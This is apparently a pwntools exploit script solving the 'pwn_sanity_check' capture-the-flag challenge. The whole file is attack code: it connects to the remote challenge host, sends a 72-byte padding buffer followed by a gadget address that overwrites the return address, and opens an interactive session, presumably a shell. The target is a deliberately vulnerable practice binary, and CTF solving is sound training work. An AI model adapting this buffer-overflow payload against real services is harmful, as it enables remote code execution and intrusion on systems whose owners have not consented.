from pwn import *
#s = process('./pwn_sanity_check')
s = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)

one_gadget = 0x4006cf

print(s.recvline())
payload = b'A' * 72
payload += p64(one_gadget)
s.sendline(payload)

s.interactive()
